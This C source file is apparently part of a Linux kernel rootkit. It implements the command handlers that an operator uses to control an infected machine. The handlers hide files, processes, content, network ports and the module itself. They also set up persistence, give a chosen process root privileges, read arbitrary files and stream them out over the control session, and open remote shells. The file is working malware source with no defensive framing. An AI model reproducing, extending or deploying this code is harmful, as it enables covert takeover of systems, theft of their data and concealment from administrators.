// SPDX-License-Identifier: GPL-2.0
// execution/commands.c - Command handlers matching protocol.toml.
#include <linux/fs.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/utsname.h>
#include "rootkit.h"

// --- Session ---

int cmd_status(struct rk_session *s, const char *arg)
{
	char buf[256];

	snprintf(buf, sizeof(buf),
		 "STATUS hidden=%s persisted=%s files=%d pids=%d content=%d ports=%d",
		 rk_is_cloaked() ? "yes" : "no",
		 rk_is_persisted() ? "yes" : "no",
		 rk_file_targets.count, rk_pid_targets.count,
		 rk_content_targets.count, rk_port_targets.count);
	return rk_send_response(s, buf);
}

int cmd_info(struct rk_session *s, const char *arg)
{
	char buf[256];

	snprintf(buf, sizeof(buf), "INFO %s %s %s",
		 utsname()->nodename, utsname()->release,
		 utsname()->machine);
	return rk_send_response(s, buf);
}

int cmd_quit(struct rk_session *s, const char *arg)
{
	return -ECONNRESET;
}

// --- Hide ---

static int hide_target(struct rk_session *s, const char *arg,
		       struct rk_target_list *list)
{
	char buf[16];
	int idx;

	if (!arg || !*arg)
		return rk_send_response(s, "ERR 1");
	idx = rk_target_add(list, arg);
	if (idx < 0)
		return rk_send_response(s, "ERR 1");

	snprintf(buf, sizeof(buf), "OK %d", idx);
	return rk_send_response(s, buf);
}

int cmd_hide_file(struct rk_session *s, const char *arg)
{
	return hide_target(s, arg, &rk_file_targets);
}

int cmd_hide_pid(struct rk_session *s, const char *arg)
{
	return hide_target(s, arg, &rk_pid_targets);
}

int cmd_hide_content(struct rk_session *s, const char *arg)
{
	return hide_target(s, arg, &rk_content_targets);
}

int cmd_hide_port(struct rk_session *s, const char *arg)
{
	return hide_target(s, arg, &rk_port_targets);
}

int cmd_hide_module(struct rk_session *s, const char *arg)
{
	rk_cloak();
	return rk_send_response(s, "OK");
}

// --- Unhide ---

static int unhide_target(struct rk_session *s, const char *arg,
			 struct rk_target_list *list)
{
	char name[RK_NAME_MAX];
	char buf[RK_NAME_MAX + 4];
	int idx;

	if (!arg || kstrtoint(arg, 10, &idx) != 0)
		return rk_send_response(s, "ERR 2");
	if (idx < 0 || idx >= list->count)
		return rk_send_response(s, "ERR 2");

	strscpy(name, list->targets[idx], RK_NAME_MAX);
	if (rk_target_remove(list, idx))
		return rk_send_response(s, "ERR 2");

	snprintf(buf, sizeof(buf), "OK %s", name);
	return rk_send_response(s, buf);
}

int cmd_unhide_file(struct rk_session *s, const char *arg)
{
	return unhide_target(s, arg, &rk_file_targets);
}

int cmd_unhide_pid(struct rk_session *s, const char *arg)
{
	return unhide_target(s, arg, &rk_pid_targets);
}

int cmd_unhide_content(struct rk_session *s, const char *arg)
{
	return unhide_target(s, arg, &rk_content_targets);
}

int cmd_unhide_port(struct rk_session *s, const char *arg)
{
	return unhide_target(s, arg, &rk_port_targets);
}

int cmd_unhide_module(struct rk_session *s, const char *arg)
{
	int error;

	rk_uncloak();
	error = rk_send_response(s, "OK");
	if (error)
		return error;
	return 1;
}

int cmd_unhide_all(struct rk_session *s, const char *arg)
{
	rk_target_clear(&rk_file_targets);
	rk_target_clear(&rk_pid_targets);
	rk_target_clear(&rk_content_targets);
	rk_target_clear(&rk_port_targets);
	rk_uncloak();
	return rk_send_response(s, "OK");
}

// --- List (count-then-index) ---

int cmd_list(struct rk_session *s, const char *arg)
{
	struct rk_target_list *list = NULL;
	char category[16];
	const char *space;
	char resp[RK_NAME_MAX + 32];
	unsigned long flags;
	int idx;

	if (!arg)
		return rk_send_response(s, "ERR 2");

	space = strchr(arg, ' ');
	if (space) {
		size_t len = space - arg;

		if (len >= sizeof(category))
			return rk_send_response(s, "ERR 2");
		memcpy(category, arg, len);
		category[len] = '\0';
	} else {
		strscpy(category, arg, sizeof(category));
	}

	if (strcmp(category, "FILE") == 0)
		list = &rk_file_targets;
	else if (strcmp(category, "PID") == 0)
		list = &rk_pid_targets;
	else if (strcmp(category, "CONTENT") == 0)
		list = &rk_content_targets;
	else if (strcmp(category, "PORT") == 0)
		list = &rk_port_targets;
	else
		return rk_send_response(s, "ERR 2");

	if (!space) {
		snprintf(resp, sizeof(resp), "LIST %d", list->count);
		return rk_send_response(s, resp);
	}

	if (kstrtoint(space + 1, 10, &idx) != 0)
		return rk_send_response(s, "ERR 2");

	spin_lock_irqsave(&list->lock, flags);
	if (idx < 0 || idx >= list->count) {
		spin_unlock_irqrestore(&list->lock, flags);
		return rk_send_response(s, "ERR 2");
	}
	snprintf(resp, sizeof(resp), "ENTRY %d %s", idx, list->targets[idx]);
	spin_unlock_irqrestore(&list->lock, flags);
	return rk_send_response(s, resp);
}

// --- Operate ---

int cmd_persist(struct rk_session *s, const char *arg)
{
	rk_persist();
	return rk_send_response(s, "OK");
}

int cmd_unpersist(struct rk_session *s, const char *arg)
{
	rk_unpersist();
	return rk_send_response(s, "OK");
}

int cmd_escalate(struct rk_session *s, const char *arg)
{
	pid_t pid;

	if (!arg || kstrtoint(arg, 10, &pid) != 0 || pid <= 0)
		return rk_send_response(s, "ERR 6");
	if (rk_escalate_pid(pid))
		return rk_send_response(s, "ERR 6");
	return rk_send_response(s, "OK");
}

int cmd_download(struct rk_session *s, const char *arg)
{
	struct file *f;
	char *buf;
	char hdr[32];
	loff_t pos = 0, size;
	int error = 0;

	if (!arg || !*arg)
		return rk_send_response(s, "ERR 3");

	f = filp_open(arg, O_RDONLY, 0);
	if (IS_ERR(f))
		return rk_send_response(s, "ERR 3");

	size = i_size_read(file_inode(f));
	snprintf(hdr, sizeof(hdr), "FILE %lld", size);
	error = rk_send_response(s, hdr);
	if (error)
		goto out_close;

	buf = kmalloc(RK_CHUNK_SIZE, GFP_KERNEL);
	if (!buf) {
		error = -ENOMEM;
		goto out_close;
	}

	for (;;) {
		ssize_t nr = kernel_read(f, buf, RK_CHUNK_SIZE, &pos);

		if (nr < 0) {
			error = (int)nr;
			break;
		}
		if (nr == 0)
			break;
		error = rk_send_sealed(s, (u8 *)buf, nr);
		if (error)
			break;
	}

	if (!error)
		error = rk_send_response(s, "EOF");

	kfree(buf);
out_close:
	filp_close(f, NULL);
	return error;
}

int cmd_shell(struct rk_session *s, const char *arg)
{
	unsigned short port;
	u32 request_id;
	u64 cookie;
	char buf[32];

	if (!arg || kstrtou16(arg, 10, &port) != 0 || !port)
		return rk_send_response(s, "ERR 5");

	get_random_bytes(&request_id, sizeof(request_id));
	get_random_bytes(&cookie, sizeof(cookie));
	if (!request_id)
		request_id = 1;
	if (!cookie)
		cookie = 1;

	if (rk_start_shell(port, request_id, cookie))
		return rk_send_response(s, "ERR 4");

	snprintf(buf, sizeof(buf), "OPEN %08x %016llx",
		 request_id, (unsigned long long)cookie);
	return rk_send_response(s, buf);
}

int cmd_exec_shell(struct rk_session *s, const char *arg)
{
	unsigned short port;
	u32 request_id;
	u64 cookie;
	char buf[32];

	if (!arg || kstrtou16(arg, 10, &port) != 0 || !port)
		return rk_send_response(s, "ERR 5");

	get_random_bytes(&request_id, sizeof(request_id));
	get_random_bytes(&cookie, sizeof(cookie));
	if (!request_id)
		request_id = 1;
	if (!cookie)
		cookie = 1;

	if (rk_start_exec_shell(port, request_id, cookie))
		return rk_send_response(s, "ERR 4");

	snprintf(buf, sizeof(buf), "OPEN %08x %016llx",
		 request_id, (unsigned long long)cookie);
	return rk_send_response(s, buf);
}

int cmd_shell_status(struct rk_session *s, const char *arg)
{
	char buf[64];

	rk_shell_status(buf, sizeof(buf));
	return rk_send_response(s, buf);
}
